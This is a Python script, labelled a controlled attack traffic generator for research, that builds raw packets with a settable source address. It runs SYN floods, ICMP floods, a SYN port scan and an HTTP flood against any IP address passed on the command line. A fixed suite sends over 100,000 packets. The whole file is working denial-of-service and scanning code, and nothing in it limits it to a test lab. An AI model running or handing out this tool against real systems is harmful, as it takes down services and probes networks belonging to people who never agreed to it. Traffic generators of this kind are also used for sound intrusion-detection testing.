#!/usr/bin/env python3
"""
Controlled Attack Traffic Generator for Research
Sends precise, deterministic attack traffic regardless of network responses

Features:
- Exact packet counts (no adaptation)
- Fixed timing (no rate adjustment)
- No retries (no intelligence)
- Ground truth tracking (counts everything sent)
"""

import socket
import struct
import time
import random
import argparse
import json
from datetime import datetime

class ControlledAttackGenerator:
    """Generate precise attack traffic for research validation"""

    def __init__(self, target_ip, source_ip="10.0.0.11"):
        self.target_ip = target_ip
        self.source_ip = source_ip
        self.stats = {
            'target': target_ip,
            'source': source_ip,
            'start_time': time.time(),
            'attacks': {}
        }

    def _checksum(self, data):
        """Calculate IP checksum"""
        s = 0
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                s += (data[i] << 8) + data[i + 1]
            else:
                s += data[i]
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def syn_flood(self, port=80, count=100000, rate=10000):
        """
        Controlled SYN flood

        Args:
            port: Target port
            count: Exact number of SYN packets to send
            rate: Packets per second (for timing)

        Returns:
            dict: Statistics including exact count sent
        """
        print(f"\n{'='*60}")
        print("CONTROLLED SYN FLOOD ATTACK")
        print(f"{'='*60}")
        print(f"Target: {self.target_ip}:{port}")
        print(f"Packets: {count:,}")
        print(f"Rate: {rate:,} packets/sec")
        print(f"Duration: ~{count/rate:.1f} seconds")
        print("")

        start_time = time.time()
        packets_sent = 0
        packets_failed = 0

        try:
            # Create raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            # Calculate inter-packet delay for rate limiting
            delay = 1.0 / rate if rate > 0 else 0

            print("Sending SYN packets...")
            last_report = time.time()

            for i in range(count):
                # Random source port
                source_port = random.randint(10000, 65535)

                # Build TCP header
                tcp_header = self._build_tcp_header(source_port, port, syn=True)

                # Build IP header
                ip_header = self._build_ip_header(len(tcp_header), socket.IPPROTO_TCP)

                # Send packet
                packet = ip_header + tcp_header
                try:
                    s.sendto(packet, (self.target_ip, 0))
                    packets_sent += 1
                except:
                    packets_failed += 1

                # Rate limiting
                if delay > 0:
                    time.sleep(delay)

                # Progress reporting every second
                if time.time() - last_report >= 1.0:
                    print(f"  Sent: {packets_sent:,} / {count:,} ({100*packets_sent/count:.1f}%)", end='\r')
                    last_report = time.time()

            s.close()

        except PermissionError:
            print("ERROR: Raw sockets require root privileges")
            print("Please run with sudo")
            return None
        except Exception as e:
            print(f"ERROR: {e}")
            return None

        elapsed = time.time() - start_time
        actual_rate = packets_sent / elapsed if elapsed > 0 else 0

        print(f"\n  Sent: {packets_sent:,} / {count:,} (100.0%)")
        print("")
        print(f"SYN flood completed")
        print(f"  Packets sent: {packets_sent:,}")
        print(f"  Packets failed: {packets_failed:,}")
        print(f"  Duration: {elapsed:.2f} seconds")
        print(f"  Actual rate: {actual_rate:,.0f} packets/sec")
        print("")

        self.stats['attacks']['syn_flood'] = {
            'port': port,
            'requested_count': count,
            'packets_sent': packets_sent,
            'packets_failed': packets_failed,
            'duration': elapsed,
            'target_rate': rate,
            'actual_rate': actual_rate,
            'attack_type': 'SYN Flood'
        }

        return self.stats['attacks']['syn_flood']

    def port_scan(self, start_port=1, end_port=1000, rate=1000):
        """
        Controlled port scan

        Args:
            start_port: First port to scan
            end_port: Last port to scan
            rate: Probes per second

        Returns:
            dict: Statistics including exact ports scanned
        """
        port_count = end_port - start_port + 1

        print(f"\n{'='*60}")
        print("CONTROLLED PORT SCAN ATTACK")
        print(f"{'='*60}")
        print(f"Target: {self.target_ip}")
        print(f"Port range: {start_port}-{end_port} ({port_count:,} ports)")
        print(f"Rate: {rate:,} probes/sec")
        print(f"Duration: ~{port_count/rate:.1f} seconds")
        print("")

        start_time = time.time()
        packets_sent = 0
        packets_failed = 0

        try:
            # Create raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            # Calculate inter-packet delay
            delay = 1.0 / rate if rate > 0 else 0

            print("Scanning ports...")
            last_report = time.time()

            for port in range(start_port, end_port + 1):
                # Random source port
                source_port = random.randint(10000, 65535)

                # Build SYN packet
                tcp_header = self._build_tcp_header(source_port, port, syn=True)
                ip_header = self._build_ip_header(len(tcp_header), socket.IPPROTO_TCP)

                packet = ip_header + tcp_header
                try:
                    s.sendto(packet, (self.target_ip, 0))
                    packets_sent += 1
                except:
                    packets_failed += 1

                # Rate limiting
                if delay > 0:
                    time.sleep(delay)

                # Progress reporting
                if time.time() - last_report >= 1.0:
                    print(f"  Scanned: {packets_sent:,} / {port_count:,} ports ({100*packets_sent/port_count:.1f}%)", end='\r')
                    last_report = time.time()

            s.close()

        except PermissionError:
            print("ERROR: Raw sockets require root privileges")
            return None
        except Exception as e:
            print(f"ERROR: {e}")
            return None

        elapsed = time.time() - start_time
        actual_rate = packets_sent / elapsed if elapsed > 0 else 0

        print(f"\n  Scanned: {packets_sent:,} / {port_count:,} ports (100.0%)")
        print("")
        print(f"Port scan completed")
        print(f"  Ports scanned: {packets_sent:,}")
        print(f"  Packets failed: {packets_failed:,}")
        print(f"  Duration: {elapsed:.2f} seconds")
        print(f"  Actual rate: {actual_rate:,.0f} probes/sec")
        print("")

        self.stats['attacks']['port_scan'] = {
            'start_port': start_port,
            'end_port': end_port,
            'port_count': port_count,
            'packets_sent': packets_sent,
            'packets_failed': packets_failed,
            'duration': elapsed,
            'target_rate': rate,
            'actual_rate': actual_rate,
            'attack_type': 'Port Scan'
        }

        return self.stats['attacks']['port_scan']

    def icmp_flood(self, count=10000, rate=1000):
        """
        Controlled ICMP flood

        Args:
            count: Exact number of ICMP packets to send
            rate: Packets per second

        Returns:
            dict: Statistics
        """
        print(f"\n{'='*60}")
        print("CONTROLLED ICMP FLOOD ATTACK")
        print(f"{'='*60}")
        print(f"Target: {self.target_ip}")
        print(f"Packets: {count:,}")
        print(f"Rate: {rate:,} packets/sec")
        print(f"Duration: ~{count/rate:.1f} seconds")
        print("")

        start_time = time.time()
        packets_sent = 0
        packets_failed = 0

        try:
            # Create raw ICMP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

            # Calculate delay
            delay = 1.0 / rate if rate > 0 else 0

            print("Sending ICMP packets...")
            last_report = time.time()

            for i in range(count):
                # Build ICMP echo request
                icmp_packet = self._build_icmp_packet(i)

                try:
                    s.sendto(icmp_packet, (self.target_ip, 0))
                    packets_sent += 1
                except:
                    packets_failed += 1

                # Rate limiting
                if delay > 0:
                    time.sleep(delay)

                # Progress
                if time.time() - last_report >= 1.0:
                    print(f"  Sent: {packets_sent:,} / {count:,} ({100*packets_sent/count:.1f}%)", end='\r')
                    last_report = time.time()

            s.close()

        except PermissionError:
            print("ERROR: Raw sockets require root privileges")
            return None
        except Exception as e:
            print(f"ERROR: {e}")
            return None

        elapsed = time.time() - start_time
        actual_rate = packets_sent / elapsed if elapsed > 0 else 0

        print(f"\n  Sent: {packets_sent:,} / {count:,} (100.0%)")
        print("")
        print(f"ICMP flood completed")
        print(f"  Packets sent: {packets_sent:,}")
        print(f"  Packets failed: {packets_failed:,}")
        print(f"  Duration: {elapsed:.2f} seconds")
        print(f"  Actual rate: {actual_rate:,.0f} packets/sec")
        print("")

        self.stats['attacks']['icmp_flood'] = {
            'requested_count': count,
            'packets_sent': packets_sent,
            'packets_failed': packets_failed,
            'duration': elapsed,
            'target_rate': rate,
            'actual_rate': actual_rate,
            'attack_type': 'ICMP Flood'
        }

        return self.stats['attacks']['icmp_flood']

    def http_flood(self, port=8080, count=500):
        """
        Controlled HTTP flood

        Args:
            port: Target HTTP port
            count: Exact number of HTTP requests to send

        Returns:
            dict: Statistics
        """
        print(f"\n{'='*60}")
        print("CONTROLLED HTTP FLOOD ATTACK")
        print(f"{'='*60}")
        print(f"Target: http://{self.target_ip}:{port}/")
        print(f"Requests: {count:,}")
        print("")

        start_time = time.time()
        requests_sent = 0
        requests_failed = 0

        print("Sending HTTP requests...")

        for i in range(count):
            try:
                # Create TCP socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)

                # Connect
                s.connect((self.target_ip, port))

                # Send HTTP GET request
                request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: ResearchBot/1.0\r\n\r\n"
                s.sendall(request.encode())

                requests_sent += 1
                s.close()

            except:
                requests_failed += 1

            if (i + 1) % 50 == 0:
                print(f"  Sent: {requests_sent:,} / {count:,} ({100*requests_sent/count:.1f}%)", end='\r')

        elapsed = time.time() - start_time
        rate = requests_sent / elapsed if elapsed > 0 else 0

        print(f"\n  Sent: {requests_sent:,} / {count:,} (100.0%)")
        print("")
        print(f"HTTP flood completed")
        print(f"  Requests sent: {requests_sent:,}")
        print(f"  Requests failed: {requests_failed:,}")
        print(f"  Duration: {elapsed:.2f} seconds")
        print(f"  Rate: {rate:.1f} requests/sec")
        print("")

        self.stats['attacks']['http_flood'] = {
            'port': port,
            'requested_count': count,
            'requests_sent': requests_sent,
            'requests_failed': requests_failed,
            'duration': elapsed,
            'rate': rate,
            'attack_type': 'HTTP Flood'
        }

        return self.stats['attacks']['http_flood']

    def _build_tcp_header(self, source_port, dest_port, syn=False):
        """Build TCP header"""
        seq = random.randint(0, 0xffffffff)
        ack_seq = 0
        offset = (5 << 4)  # 5 words (20 bytes)
        flags = 0x02 if syn else 0  # SYN flag
        window = 5840
        check = 0
        urg_ptr = 0

        tcp_header = struct.pack(
            '!HHLLBBHHH',
            source_port, dest_port, seq, ack_seq,
            offset, flags, window, check, urg_ptr
        )

        # Pseudo header for checksum
        source_addr = socket.inet_aton(self.source_ip)
        dest_addr = socket.inet_aton(self.target_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)

        pseudo_header = struct.pack(
            '!4s4sBBH',
            source_addr, dest_addr, placeholder, protocol, tcp_length
        )

        checksum = self._checksum(pseudo_header + tcp_header)
        tcp_header = struct.pack(
            '!HHLLBBH',
            source_port, dest_port, seq, ack_seq, offset, flags, window
        ) + struct.pack('H', checksum) + struct.pack('!H', urg_ptr)

        return tcp_header

    def _build_ip_header(self, payload_len, protocol):
        """Build IP header"""
        version_ihl = (4 << 4) | 5
        tos = 0
        total_len = 20 + payload_len
        id = random.randint(0, 65535)
        frag_off = 0
        ttl = 64
        check = 0

        source_addr = socket.inet_aton(self.source_ip)
        dest_addr = socket.inet_aton(self.target_ip)

        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            version_ihl, tos, total_len, id, frag_off,
            ttl, protocol, check, source_addr, dest_addr
        )

        checksum = self._checksum(ip_header)
        ip_header = struct.pack(
            '!BBHHHBB',
            version_ihl, tos, total_len, id, frag_off, ttl, protocol
        ) + struct.pack('H', checksum) + struct.pack('!4s4s', source_addr, dest_addr)

        return ip_header

    def _build_icmp_packet(self, seq):
        """Build ICMP echo request"""
        icmp_type = 8  # Echo request
        code = 0
        checksum = 0
        packet_id = random.randint(0, 65535)
        sequence = seq

        # Data payload (56 bytes like standard ping)
        data = b'A' * 56

        # Pack header
        header = struct.pack('!BBHHH', icmp_type, code, checksum, packet_id, sequence)

        # Calculate checksum
        checksum = self._checksum(header + data)

        # Repack with checksum
        header = struct.pack('!BBH', icmp_type, code, checksum) + struct.pack('!HH', packet_id, sequence)

        return header + data

    def run_standard_suite(self):
        """Run standard attack suite with fixed parameters"""
        print(f"\n{'='*60}")
        print("CONTROLLED ATTACK SUITE")
        print(f"{'='*60}")
        print(f"Target: {self.target_ip}")
        print(f"Source: {self.source_ip}")
        print("")
        print("Attack sequence:")
        print("  1. HTTP Flood: 500 requests")
        print("  2. ICMP Flood: 10,000 packets @ 1000 pps")
        print("  3. Port Scan: Ports 1-1000 @ 1000 pps")
        print("  4. SYN Flood: 100,000 packets @ 10000 pps")
        print("")
        print(f"{'='*60}")
        print("")

        # Run attacks
        self.http_flood(port=8080, count=500)
        time.sleep(2)

        self.icmp_flood(count=10000, rate=1000)
        time.sleep(2)

        self.port_scan(start_port=1, end_port=1000, rate=1000)
        time.sleep(2)

        self.syn_flood(port=8080, count=100000, rate=10000)

        # Finalize stats
        self.stats['end_time'] = time.time()
        self.stats['total_duration'] = self.stats['end_time'] - self.stats['start_time']

        # Calculate totals
        total_packets = sum(
            attack.get('packets_sent', attack.get('requests_sent', 0))
            for attack in self.stats['attacks'].values()
        )

        self.stats['totals'] = {
            'total_packets_sent': total_packets,
            'total_duration': self.stats['total_duration']
        }

        # Print summary
        print(f"\n{'='*60}")
        print("ATTACK SUITE COMPLETED")
        print(f"{'='*60}")
        print("")

        for attack_name, attack_data in self.stats['attacks'].items():
            print(f"{attack_data['attack_type']}:")
            if 'packets_sent' in attack_data:
                print(f"  Packets sent: {attack_data['packets_sent']:,}")
            if 'requests_sent' in attack_data:
                print(f"  Requests sent: {attack_data['requests_sent']:,}")
            print(f"  Duration: {attack_data['duration']:.2f}s")
            print("")

        print(f"{'='*60}")
        print(f"TOTAL PACKETS SENT: {total_packets:,}")
        print(f"TOTAL DURATION: {self.stats['total_duration']:.1f} seconds")
        print(f"{'='*60}")
        print("")

        # Save statistics
        timestamp = int(time.time())
        stats_file = f"/tmp/controlled_attack_stats_{timestamp}.json"
        with open(stats_file, 'w') as f:
            json.dump(self.stats, f, indent=2)

        print(f"Statistics saved to: {stats_file}")
        print("")

        return self.stats


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Controlled Attack Traffic Generator')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('--source', default='10.0.0.11', help='Source IP (default: 10.0.0.11)')
    parser.add_argument('--attack', choices=['syn', 'scan', 'http', 'icmp', 'all'],
                       default='all', help='Attack type (default: all)')

    # Attack-specific parameters
    parser.add_argument('--syn-count', type=int, default=100000, help='SYN flood packet count')
    parser.add_argument('--syn-rate', type=int, default=10000, help='SYN flood rate (pps)')
    parser.add_argument('--icmp-count', type=int, default=10000, help='ICMP flood packet count')
    parser.add_argument('--icmp-rate', type=int, default=1000, help='ICMP flood rate (pps)')
    parser.add_argument('--http-count', type=int, default=500, help='HTTP request count')
    parser.add_argument('--scan-start', type=int, default=1, help='Port scan start port')
    parser.add_argument('--scan-end', type=int, default=1000, help='Port scan end port')
    parser.add_argument('--scan-rate', type=int, default=1000, help='Port scan rate (pps)')

    args = parser.parse_args()

    generator = ControlledAttackGenerator(args.target, args.source)

    if args.attack == 'all':
        generator.run_standard_suite()
    elif args.attack == 'syn':
        generator.syn_flood(count=args.syn_count, rate=args.syn_rate)
    elif args.attack == 'scan':
        generator.port_scan(start_port=args.scan_start, end_port=args.scan_end, rate=args.scan_rate)
    elif args.attack == 'http':
        generator.http_flood(count=args.http_count)
    elif args.attack == 'icmp':
        generator.icmp_flood(count=args.icmp_count, rate=args.icmp_rate)
